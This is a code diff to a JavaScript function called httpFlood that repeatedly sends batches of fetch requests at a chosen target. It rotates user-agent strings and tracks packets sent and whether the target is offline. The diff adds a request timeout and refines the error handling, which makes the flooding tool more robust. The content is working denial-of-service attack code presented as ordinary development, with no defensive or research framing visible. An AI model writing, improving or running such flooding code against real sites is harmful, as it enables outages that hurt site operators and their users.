@@ -27,6 +27,13 @@ async function httpFlood(target, duration, intensity) {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
     ];
 
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => {
+      controller.abort();
+      targetStatus = 'Timeout';
+      console.warn("Request timed out");
+    }, 15000); // Set a timeout of 15 seconds
+
     while (Date.now() - startTime < duration * 1000) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
@@ -40,7 +47,8 @@ async function httpFlood(target, duration, intensity) {
               'Cache-Control': 'no-cache',
               'Connection': 'keep-alive'
             },
-            mode: 'no-cors'
+            mode: 'no-cors',
+            signal: controller.signal,
           })
           .then(response => {
             packetsSent++;
@@ -55,14 +63,21 @@ async function httpFlood(target, duration, intensity) {
             }
           })
           .catch(error => {
-            targetStatus = 'Offline';
-            console.warn("Request failed:", error); // Log the error for debugging.
+            if (error.name === 'AbortError') {
+              // Timeout, handled above
+            } else {
+              targetStatus = 'Offline';
+              console.warn("Request failed:", error); // Log the error for debugging.
+            }
           });
         promises.push(promise);
       }
       await Promise.all(promises);
       await new Promise(resolve => setTimeout(resolve, interval));
     }
+
+    clearTimeout(timeoutId);
+
   } catch (error) {
     console.error("Error in httpFlood:", error);
     targetStatus = 'Offline';
